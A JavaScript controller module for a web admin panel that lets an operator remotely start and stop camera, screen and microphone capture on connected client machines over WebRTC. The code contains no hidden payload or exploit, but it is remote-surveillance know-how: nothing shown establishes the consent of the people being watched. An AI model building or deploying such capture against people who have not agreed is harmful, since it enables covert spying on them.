/**
 * 远程设备控制 —— 控制端（web 管理"已登录电脑控制"面板）
 *
 * 点进一台在线远程客户端设备后：
 *   dev:view       → 绑定控制器，取 iceServers
 *   dev:enumerate  → 被控端枚举摄像头/麦克风，经 dev:devices 上报
 *   dev:start      → 开始采集（camera / screen / mic），WebRTC 接收流显示
 *   dev:stop       → 停止
 *   信令 dev:signal（被控端 sender offer → 控制端 answer + 双向 ICE trickle）
 */
;(function () {
  const A = window.__admin
  if (!A) return
  const RV = (A.remoteView = A.remoteView || {})
  const $ = (id) => document.getElementById(id)

  RV.deviceId = ''
  RV.cams = []
  RV.mics = []
  RV._pc = null
  RV._kind = ''
  RV._ice = null
  RV._pendCands = []
  RV._bound = false

  function log(msg) { console.log('[rv] ' + msg) }

  function bind() {
    if (RV._bound) return
    RV._bound = true
    A.sock.on('dev:devices', (d) => {
      if (!RV.deviceId || d.deviceId !== RV.deviceId) return
      RV.cams = d.cams || []
      RV.mics = d.mics || []
      log('收到设备列表 cams=' + RV.cams.length + ' mics=' + RV.mics.length)
    })
    A.sock.on('dev:signal', (d) => {
      if (!RV.deviceId || d.deviceId !== RV.deviceId) return
      RV._handleSignal(d.signal || {})
    })
    A.sock.on('dev:start', () => {})
    // 设备离线/被抢占兜底
    A.sock.on('disconnect', () => RV.stop())
  }

  RV.open = async function (device) {
    RV.deviceId = device.id
    RV.cams = []
    RV.mics = []
    RV._kind = ''
    RV._pendCands = []
    bind()
    $('remote-panel').style.display = ''
    $('rv-empty').style.display = ''
    $('rv-state').textContent = '连接中…'
    $('rv-video').srcObject = null
    $('rv-cam').disabled = false
    $('rv-screen').disabled = false
    $('rv-mic').disabled = false
    $('rv-stop').disabled = false
    const ack = await A.emit('dev:view', { deviceId: RV.deviceId }).catch(() => ({ ok: false }))
    if (!ack.ok) { $('rv-state').textContent = '查看失败：' + (ack.error || ''); return }
    RV._ice = ack.iceServers || [{ urls: 'stun:stun.l.google.com:19302' }]
    $('rv-state').textContent = ack.name + '（' + ack.ip + '）在线'
    A.emit('dev:enumerate', { deviceId: RV.deviceId })
  }

  RV._buildPC = function () {
    try {
      RV._pc = new RTCPeerConnection({ iceServers: RV._ice })
    } catch (e) { log('pc 创建失败 ' + e); return null }
    RV._pc.onicecandidate = (ev) => {
      if (ev.candidate) A.sock.emit('dev:signal', { deviceId: RV.deviceId, signal: { type: 'candidate', sdp: undefined, candidate: ev.candidate.toJSON() } })
    }
    RV._pc.onconnectionstatechange = () => log('connectionState=' + (RV._pc && RV._pc.connectionState))
    RV._pc.ontrack = (ev) => {
      const vid = $('rv-video')
      vid.srcObject = ev.streams[0] || new MediaStream([ev.track])
      // 摄像头静音；麦克风放音
      vid.muted = RV._kind !== 'mic'
      void vid.play().catch(() => {})
      $('rv-empty').style.display = 'none'
      $('rv-state').textContent = '正在查看' + (RV._kind === 'screen' ? '屏幕' : RV._kind === 'mic' ? '麦克风' : '摄像头')
    }
    return RV._pc
  }

  RV._handleSignal = async function (signal) {
    if (!RV._pc) { log('收到信令但 pc 未建立：' + (signal.type || 'candidate')); return }
    try {
      if (signal.type === 'offer' && signal.sdp) {
        await RV._pc.setRemoteDescription({ type: 'offer', sdp: signal.sdp })
        // 补投缓冲的 ICE
        for (const c of RV._pendCands) { try { await RV._pc.addIceCandidate(c) } catch {} }
        RV._pendCands = []
        const ans = await RV._pc.createAnswer()
        await RV._pc.setLocalDescription(ans)
        A.sock.emit('dev:signal', { deviceId: RV.deviceId, signal: { type: 'answer', sdp: ans.sdp, candidate: undefined } })
        log('已回复 answer')
      } else if (signal.candidate) {
        const cand = signal.candidate
        if (RV._pc.remoteDescription && RV._pc.remoteDescription.type) {
          try { await RV._pc.addIceCandidate(cand) } catch (e) { log('addIceCandidate 失败 ' + e) }
        } else {
          RV._pendCands.push(cand)
        }
      } else if (signal.type === 'error') {
        $('rv-state').textContent = '远程错误：' + String(signal.candidate || '')
      }
    } catch (e) {
      log('信令处理失败 ' + e)
    }
  }

  RV.start = async function (kind, device) {
    if (!RV.deviceId) return
    RV._teardownPC()
    RV._pendCands = []
    RV._kind = kind
    $('rv-empty').style.display = ''
    $('rv-state').textContent = '正在请求' + (kind === 'screen' ? '屏幕' : kind === 'mic' ? '麦克风' : '摄像头') + '…'
    const ack = await A.emit('dev:start', { deviceId: RV.deviceId, kind, device }).catch(() => ({ ok: false }))
    if (!ack.ok) { $('rv-state').textContent = '启动失败：' + (ack.error || ''); return }
    if (!RV._buildPC()) return
    // 被控端将作为 sender 发 offer；我们等待其 offer
    setTimeout(() => { if (!RV._pc || !RV._pc.remoteDescription) log('等待被控端 offer…') }, 2000)
  }

  RV.cam = function () { RV._menu(RV.cams, 'camera', '选择摄像头') }
  RV.mic = function () { RV._menu(RV.mics, 'mic', '选择麦克风') }
  RV.screen = function () { RV.start('screen') }

  // 右键设备菜单（摄像头/麦克风列表）
  RV._menu = function (list, kind, title) {
    const m = $('rv-menu')
    m.innerHTML = ''
    const t = document.createElement('div'); t.className = 'rv-menu-title'; t.textContent = title; m.appendChild(t)
    if (!list || !list.length) {
      const e = document.createElement('div'); e.className = 'rv-menu-item'; e.textContent = '（暂无设备，请先在目标机连接设备）'; m.appendChild(e)
    } else {
      list.forEach((dev) => {
        const it = document.createElement('div'); it.className = 'rv-menu-item'; it.textContent = dev.label || dev.id
        it.onclick = () => { RV.start(kind, dev.id); RV.hideMenu() }
        m.appendChild(it)
      })
    }
    m.style.display = ''
    // 定位到触发按钮上方
    const btn = kind === 'mic' ? $('rv-mic') : $('rv-cam')
    const r = btn.getBoundingClientRect()
    const menuH = m.offsetHeight || 180
    const top = Math.max(8, r.top - menuH - 4)
    m.style.left = Math.max(8, Math.min(r.left, window.innerWidth - 240)) + 'px'
    m.style.top = top + 'px'
  }
  RV.hideMenu = function () { $('rv-menu').style.display = 'none' }

  RV._teardownPC = function () {
    if (RV._pc) {
      RV._pc.onicecandidate = null
      RV._pc.onconnectionstatechange = null
      RV._pc.ontrack = null
      try { RV._pc.close() } catch {}
      RV._pc = null
    }
  }

  RV.stop = function () {
    if (RV.deviceId) A.emit('dev:stop', { deviceId: RV.deviceId }).catch(() => {})
    RV._teardownPC()
    RV._pendCands = []
    RV._kind = ''
    const vid = $('rv-video')
    if (vid) vid.srcObject = null
    RV.deviceId = ''
  }
})()
